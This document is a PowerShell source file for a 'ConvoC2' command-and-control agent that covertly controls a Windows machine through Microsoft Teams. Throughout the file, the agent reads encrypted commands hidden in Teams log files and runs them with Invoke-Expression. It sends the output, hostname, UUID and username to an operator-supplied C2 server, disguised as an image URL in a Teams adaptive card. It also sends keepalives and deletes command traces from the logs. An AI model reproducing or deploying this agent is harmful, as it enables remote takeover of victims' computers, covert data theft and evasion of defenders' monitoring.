# ConvoC2 PowerShell Agent 
# This is a fileless implementation of the convoC2 agent for Windows systems
# It directly monitors Microsoft Teams logs and executes commands

param(
    [Parameter(Mandatory=$true)]
    [string] $ServerURL, # C2 Server URL (e.g., http://10.11.12.13/)
    
    [Parameter(Mandatory=$true)]
    [string] $WebhookURL, # Teams webhook URL
    
    [Parameter(Mandatory=$false)]
    [int] $Timeout = 1, # Polling timeout in seconds
    
    [Parameter(Mandatory=$false)]
    [switch] $Verbose, # Enable verbose logging
    
    [Parameter(Mandatory=$false)]
    [string] $EncryptionKey = "convoC2-default-key-change-me-now!!" # Default encryption key
)

# Encryption functions
function Encrypt-String {
    param(
        [Parameter(Mandatory=$true)]
        [string] $Plaintext,
        
        [Parameter(Mandatory=$true)]
        [byte[]] $Key
    )
    
    $secureString = ConvertTo-SecureString -String $Plaintext -AsPlainText -Force
    $encrypted = ConvertFrom-SecureString -SecureString $secureString -Key $Key
    return $encrypted
}

function Decrypt-String {
    param(
        [Parameter(Mandatory=$true)]
        [string] $EncryptedText,
        
        [Parameter(Mandatory=$true)]
        [byte[]] $Key
    )
    
    $secureString = ConvertTo-SecureString -String $EncryptedText -Key $Key
    $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
    $plaintext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
    
    return $plaintext
}

# Get agent ID (machine ID + random component for uniqueness)
function Get-AgentID {
    $computerName = $env:COMPUTERNAME
    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $uniqueID = "$computerName-$uuid"
    return $uniqueID
}

# Get current user's full name
function Get-CurrentUserFull {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return $currentUser.Name
}

# Convert ASCII encoding key to byte array
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($EncryptionKey)

# Initialize agent
$agentID = Get-AgentID
$username = Get-CurrentUserFull

if ($Verbose) {
    Write-Host "Agent initialized for user: $username"
    Write-Host "Agent ID: $agentID"
}

# Find Microsoft Teams log directory
function Find-TeamsLogDir {
    $appData = [Environment]::GetFolderPath('ApplicationData')
    $teamsLogPath = Join-Path $appData "Microsoft\Teams\logs.txt"
    
    # Check for new Teams client first
    $newTeamsLogDir = Join-Path $appData "Microsoft\Teams\logs"
    if (Test-Path $newTeamsLogDir) {
        return $newTeamsLogDir
    }
    
    # Check for old Teams client
    $oldTeamsLogDir = Join-Path $appData "Microsoft\Teams"
    if (Test-Path $oldTeamsLogDir) {
        return $oldTeamsLogDir
    }
    
    throw "Microsoft Teams log directory not found"
}

function Find-TeamsLogFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string] $LogDirectory
    )
    
    $logFiles = @()
    
    # Add logs.txt and old app logs
    $logsTxt = Join-Path $LogDirectory "logs.txt"
    if (Test-Path $logsTxt) {
        $logFiles += $logsTxt
    }
    
    # Find indexed_db logs which might contain messages
    $logFiles += Get-ChildItem -Path $LogDirectory -Filter "*-log.txt" -Recurse -File | 
                Select-Object -ExpandProperty FullName
    
    return $logFiles
}

function Read-Command {
    param(
        [Parameter(Mandatory=$true)]
        [string] $LogContent
    )
    
    # Look for the hidden span tag with aria-label command
    $pattern = '<span[^>]*aria-label="([^"]*)"[^>]*></span>'
    $match = [regex]::Match($LogContent, $pattern)
    
    if ($match.Success) {
        return $match.Groups[1].Value
    }
    
    return $null
}

function Execute-Command {
    param(
        [Parameter(Mandatory=$true)]
        [string] $Command
    )
    
    try {
        $output = Invoke-Expression -Command $Command | Out-String
        return @{
            Command = $Command
            Output = $output
            Success = $true
        }
    }
    catch {
        return @{
            Command = $Command
            Output = $_.Exception.Message
            Success = $false
        }
    }
}

function Send-NotifyToServer {
    param(
        [Parameter(Mandatory=$true)]
        [string] $WebhookURL,
        
        [Parameter(Mandatory=$true)]
        [string] $ServerURL
    )
    
    $random = [System.Guid]::NewGuid().ToString()
    $timestamp = [int](Get-Date -UFormat %s)
    
    $notifyMsg = @{
        AgentID = $agentID
        Username = $username
        Random = $random
        Timestamp = $timestamp
    }
    
    $notifyJSON = $notifyMsg | ConvertTo-Json -Compress
    $encodedNotify = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($notifyJSON))
    
    $fullURL = "$ServerURL/hello/$encodedNotify"
    
    $body = @{
        type = "message"
        attachments = @(
            @{
                contentType = "application/vnd.microsoft.card.adaptive"
                content = @{
                    '$schema' = "http://adaptivecards.io/schemas/adaptive-card.json"
                    type = "AdaptiveCard"
                    version = "1.2"
                    body = @(
                        @{
                            type = "TextBlock"
                            text = "😈 ..convoC2 is cooking.. 😈"
                            size = "Large"
                            weight = "Bolder"
                        },
                        @{
                            type = "Image"
                            url = $fullURL
                            size = "Small"
                        }
                    )
                }
            }
        )
    }
    
    $bodyJSON = $body | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $bodyJSON -ContentType "application/json"
}

function Send-ResultToServer {
    param(
        [Parameter(Mandatory=$true)]
        [hashtable] $CommandOutput,
        
        [Parameter(Mandatory=$true)]
        [string] $WebhookURL,
        
        [Parameter(Mandatory=$true)]
        [string] $ServerURL
    )
    
    $random = [System.Guid]::NewGuid().ToString()
    
    $resultMsg = @{
        Output = $CommandOutput.Output
        Success = $CommandOutput.Success
        Command = $CommandOutput.Command
        Random = $random
        AgentID = $agentID
        Username = $username
    }
    
    $resultJSON = $resultMsg | ConvertTo-Json -Compress
    $encodedResult = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($resultJSON))
    
    $fullURL = "$ServerURL/command/$encodedResult"
    
    $body = @{
        type = "message"
        attachments = @(
            @{
                contentType = "application/vnd.microsoft.card.adaptive"
                content = @{
                    '$schema' = "http://adaptivecards.io/schemas/adaptive-card.json"
                    type = "AdaptiveCard"
                    version = "1.2"
                    body = @(
                        @{
                            type = "TextBlock"
                            text = "😈 ..convoC2 is cooking.. 😈"
                            size = "Large"
                            weight = "Bolder"
                        },
                        @{
                            type = "Image"
                            url = $fullURL
                            size = "Small"
                        }
                    )
                }
            }
        )
    }
    
    $bodyJSON = $body | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $bodyJSON -ContentType "application/json"
}

function Send-Keepalive {
    param(
        [Parameter(Mandatory=$true)]
        [string] $WebhookURL,
        
        [Parameter(Mandatory=$true)]
        [string] $ServerURL
    )
    
    $random = [System.Guid]::NewGuid().ToString()
    $timestamp = [int](Get-Date -UFormat %s)
    
    $keepaliveMsg = @{
        AgentID = $agentID
        Username = $username
        Random = $random
        Timestamp = $timestamp
    }
    
    $keepaliveJSON = $keepaliveMsg | ConvertTo-Json -Compress
    $encodedKeepalive = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($keepaliveJSON))
    
    $fullURL = "$ServerURL/keepalive/$encodedKeepalive"
    
    $body = @{
        type = "message"
        attachments = @(
            @{
                contentType = "application/vnd.microsoft.card.adaptive"
                content = @{
                    '$schema' = "http://adaptivecards.io/schemas/adaptive-card.json"
                    type = "AdaptiveCard"
                    version = "1.2"
                    body = @(
                        @{
                            type = "TextBlock"
                            text = "😈 ..convoC2 is cooking.. 😈"
                            size = "Large"
                            weight = "Bolder"
                        },
                        @{
                            type = "Image"
                            url = $fullURL
                            size = "Small"
                        }
                    )
                }
            }
        )
    }
    
    $bodyJSON = $body | ConvertTo-Json -Depth 10
    
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $bodyJSON -ContentType "application/json"
}

# Clean up old commands from log file
function Clean-OldCommands {
    param(
        [Parameter(Mandatory=$true)]
        [string] $LogFilePath,
        
        [Parameter(Mandatory=$true)]
        [string] $LogContent
    )
    
    $pattern = '<span[^>]*aria-label="[^"]*"[^>]*></span>'
    $cleanedContent = [regex]::Replace($LogContent, $pattern, "")
    Set-Content -Path $LogFilePath -Value $cleanedContent
}

# Main loop
try {
    $logDirPath = Find-TeamsLogDir
    if ($Verbose) {
        Write-Host "Found MS Teams log dir at: $logDirPath"
    }
    
    # Notify server that a new agent can receive commands
    Send-NotifyToServer -WebhookURL $WebhookURL -ServerURL $ServerURL
    
    if ($Verbose) {
        Write-Host "C2 Server notified"
        Write-Host "Waiting for commands.."
    }
    
    # Start keepalive job in background
    $keepaliveJob = Start-Job -ScriptBlock {
        param($ServerURL, $WebhookURL, $agentID, $username, $Timeout, $Verbose)
        
        while ($true) {
            try {
                $random = [System.Guid]::NewGuid().ToString()
                $timestamp = [int](Get-Date -UFormat %s)
                
                $keepaliveMsg = @{
                    AgentID = $agentID
                    Username = $username
                    Random = $random
                    Timestamp = $timestamp
                }
                
                $keepaliveJSON = $keepaliveMsg | ConvertTo-Json -Compress
                $encodedKeepalive = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($keepaliveJSON))
                
                $fullURL = "$ServerURL/keepalive/$encodedKeepalive"
                
                $body = @{
                    type = "message"
                    attachments = @(
                        @{
                            contentType = "application/vnd.microsoft.card.adaptive"
                            content = @{
                                '$schema' = "http://adaptivecards.io/schemas/adaptive-card.json"
                                type = "AdaptiveCard"
                                version = "1.2"
                                body = @(
                                    @{
                                        type = "TextBlock"
                                        text = "😈 ..convoC2 is cooking.. 😈"
                                        size = "Large"
                                        weight = "Bolder"
                                    },
                                    @{
                                        type = "Image"
                                        url = $fullURL
                                        size = "Small"
                                    }
                                )
                            }
                        }
                    )
                }
                
                $bodyJSON = $body | ConvertTo-Json -Depth 10
                
                Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $bodyJSON -ContentType "application/json"
                
                if ($Verbose) {
                    Write-Host "Keepalive sent"
                }
            }
            catch {
                if ($Verbose) {
                    Write-Host "Failed to send keepalive: $_"
                }
            }
            
            Start-Sleep -Seconds ($Timeout * 10)
        }
    } -ArgumentList $ServerURL, $WebhookURL, $agentID, $username, $Timeout, $Verbose
    
    while ($true) {
        $encryptedCommand = $null
        $logFilePath = $null
        
        # Get the list of log files (may change during time)
        $logFiles = Find-TeamsLogFiles -LogDirectory $logDirPath
        
        # Iterate over the log files to find the command
        foreach ($logFile in $logFiles) {
            try {
                $logContent = Get-Content -Path $logFile -Raw -ErrorAction SilentlyContinue
                if (-not $logContent) { continue }
                
                # Check for the command in the log file
                $encryptedCommand = Read-Command -LogContent $logContent
                if ($encryptedCommand) {
                    $logFilePath = $logFile
                    break # Stop searching after finding the command
                }
            }
            catch {
                # Just continue to the next file on error
                continue
            }
        }
        
        if (-not $encryptedCommand) {
            Start-Sleep -Seconds $Timeout
            continue
        }
        
        # Attempt to decrypt the command
        try {
            $command = Decrypt-String -EncryptedText $encryptedCommand -Key $keyBytes
            
            if ($Verbose) {
                Write-Host "Found command: $command"
                Write-Host "Executing command.."
            }
            
            # Execute the command
            $commandOutput = Execute-Command -Command $command
            
            if ($Verbose) {
                Write-Host "Command executed: $($commandOutput.Success)"
                Write-Host "Sending result to server..."
            }
            
            # Embed result in Teams adaptive card and trigger webhook
            Send-ResultToServer -CommandOutput $commandOutput -WebhookURL $WebhookURL -ServerURL $ServerURL
            
            if ($Verbose) {
                Write-Host "C2 Server should receive the result shortly.."
                Write-Host "Cleaning up old commands.."
            }
            
            # Clean up old commands 
            if ($logFilePath) {
                $logContent = Get-Content -Path $logFilePath -Raw -ErrorAction SilentlyContinue
                if ($logContent) {
                    Clean-OldCommands -LogFilePath $logFilePath -LogContent $logContent
                }
            }
        }
        catch {
            if ($Verbose) {
                Write-Host "Failed to decrypt or process command: $_"
            }
        }
        
        Start-Sleep -Seconds $Timeout
    }
}
catch {
    Write-Error "Agent failed to run: $_"
    exit 1
}
finally {
    if ($keepaliveJob) {
        Stop-Job -Job $keepaliveJob
        Remove-Job -Job $keepaliveJob
    }
} 